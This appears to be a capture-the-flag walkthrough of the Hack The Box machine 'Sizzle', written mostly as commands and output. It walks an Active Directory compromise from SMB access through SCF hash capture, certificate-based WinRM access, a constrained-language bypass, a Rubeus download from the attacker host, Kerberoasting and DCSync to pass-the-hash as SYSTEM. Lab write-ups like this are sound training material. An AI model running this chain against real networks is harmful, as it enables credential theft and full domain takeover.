# Nmap:
```bash
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
|_ssl-date: 2023-07-05T04:11:01+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_ssl-date: 2023-07-05T04:11:02+00:00; 0s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
|_ssl-date: 2023-07-05T04:11:01+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2023-07-05T04:11:02+00:00; 0s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
|_ssl-date: 2023-07-05T04:11:01+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2018-07-02T20:26:23
|_Not valid after:  2019-07-02T20:26:23
|_ssl-date: 2023-07-05T04:11:01+00:00; 0s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
58854/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-07-05T04:10:26
|_  start_date: 2023-07-05T03:42:45
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```


# using smbmap:
```bash
└─$ smbmap -u "anonymous" -H 10.10.10.103 
[+] Guest session       IP: 10.10.10.103:445    Name: 10.10.10.103                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                         NO ACCESS       Default share
        CertEnroll                                              NO ACCESS       Active Directory Certificate Services share
        Department Shares                                READ ONLY
        IPC$                                                       READ ONLY       Remote IPC
        NETLOGON                                             NO ACCESS       Logon server share 
        Operations                                              NO ACCESS
        SYSVOL                                                  NO ACCESS       Logon server share 

```

# Mounted smb shares:
```bash
└─$ sudo mount -o user=nouser -t cifs "//10.10.10.103/Department Shares" /mnt/
```
# Found Users:
```bash
┌──(singhx㉿kali)-[/mnt/Accounting]
└─$ ls Users      
amanda  amanda_adm  bill  bob  chris  henry  joe  jose  lkys37en  morgan  mrb3n  Public
```

# Found write permissions in smbclient: Users/Public and ZZ_Archieve flder Upload a .scf file for capturing ntlm hash using responder:
```bash
========make a file .scf==========
└─$ cat file.scf 
[Shell]
Command=2

IconFile=\\10.10.14.4\icon
```     
                          
# Setup responder to capture hash: 
```bash
└─# responder -I tun0          
```
# Upload file to the writeable folders
```bash
smb: \Users\Public\> put file.scf 
putting file file.scf as \Users\Public\file.scf (0.2 kb/s) (average 0.2 kb/s)


got hash captured... If not works restart the machine.
```

# Crack the hash:
```bash
└─$ hashcat hash /usr/share/wordlists/rockyou.txt         
000000000000000000000000:Ashare1972
```

# Dumped Ldapdomain:
```bash
└─# ldapdomaindump -u 'htb.local\amanda' -p Ashare1972 10.10.10.103 -o /home/singhx/htb/sizzle/ldap
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished

└─# ls /home/singhx/htb/sizzle/ldap

domain_computers_by_os.html  domain_computers.html  domain_groups.grep  domain_groups.json  domain_policy.html  domain_trusts.grep  domain_trusts.json          domain_users.grep  domain_users.json
domain_computers.grep        domain_computers.json  domain_groups.html  domain_policy.grep  domain_policy.json  domain_trusts.html  domain_users_by_group.html  domain_users.html
```
# ========view data============
```bash
└─$ firefox domain_users.html
```
![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/52312ac2-2593-4942-a3e7-e45eeb8a7f1b)

# Do gobuster dirsearch:
```bash
└─$ gobuster dir -u http://10.10.10.103 -w /usr/share/wordlists/dirb/common.txt 
/certenroll           (Status: 301) [Size: 154] [--> http://10.10.10.103/certenroll/]
/certsrv              (Status: 401) [Size: 1293]
/images               (Status: 301) [Size: 150] [-
```
# ===========navigate to certsrv=========

![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/3ec54517-8f48-48a4-b34d-d7b543500b84)

 # Generated a new certificate:
 ```bash
 └─$ openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
```
# Let's upload the certificate:
```bash
└─$ cat amanda.csr 
```
![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/4a06e75e-9b88-48d3-b0a3-69b630ae1628)

# Run blood hound using the cmd:
```bash
└─$ bloodhound-python -u amanda -p Ashare1972 -c all -d htb.local -ns 10.10.10.103 --auth-method auto   
INFO: Found AD domain: htb.local
=========we got mrlky has kerberost attack possible=========
```
# Using the ruby script we got shell:
```bash
require 'winrm'
```
# Author: Alamot
```bash
conn = WinRM::Connection.new(
  endpoint: 'https://10.10.10.103:5986/wsman',
  transport: :ssl,
  client_cert: 'amanda.cer',
  client_key: 'amanda.key',
  :no_ssl_peer_verification => true
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = gets
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end
    puts "Exiting with code #{output.exitcode}"
end


└─# ruby ruby_winrm.rb 
PS htb\amanda@SIZZLE Documents> dir
```
# ======== we are in constratint language mode=========
```bash
PS htb\amanda@SIZZLE temp> $executioncontext.sessionstate.languagemode
ConstrainedLanguage
```
# We can bypass by using the low version of powershell:
```bash
PS htb\amanda@SIZZLE temp> powershell -version 2 -c '$executioncontext.sessionstate.languagemode'
FullLanguage
```
## OR use the evail-winrm:
```bash
└─# evil-winrm -c amanda.cer -k amanda.key -i 10.10.10.103 -u amanda -p Ashare1972 -S
```
# Upload Rubeus.exe in c:\windows\system32\spool\drivers\color\ as it is out of constraint:
 ```bash
 IWR -o r.exe http://10.10.14.4:80/Rubeus.exe

 .\r.exe hash /password:Ashare1972

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Calculate Password Hash(es)

[*] Input password             : Ashare1972
[*]       rc4_hmac             : 7D0516EA4B6ED084F3FDF71C47D9BEB3


 .\r.exe asktgt /user:amanda /rc4:7D0516EA4B6ED084F3FDF71C47D9BEB3 /outfile:amanda-tgt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT


 .\r.exe asktgs /service:http/sizzle /ticket:amanda-tgt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGS


 .\r.exe kerberoast /spn:http/sizzle /ticket:amanda-tgt /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Kerberoasting
```

# Crack the hash:
```bash
└─$ hashcat kirb_hash /usr/share/wordlists/rockyou.txt
96238df13d:Football#7
```
# Found from bloodhound that mrlky has GetChanges rights on the HTB.LOCAL:

![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/53a8ac11-0751-45be-b8e0-0663a56294bc)

# From bloodhound we know that mrlky has dcsync permisions:
```bash
└─$ secretsdump.py htb.local/mrlky:'Football#7'@10.10.10.103                               
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
```

# Login usin psexec, wmiexec, smbexec :
```bash
└─$ psexec.py htb/administrator@10.10.10.103 -hashes :f6b7160bfc91823792e0ac3a162c9267 
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
C:\Users>whoami
nt authority\system
```
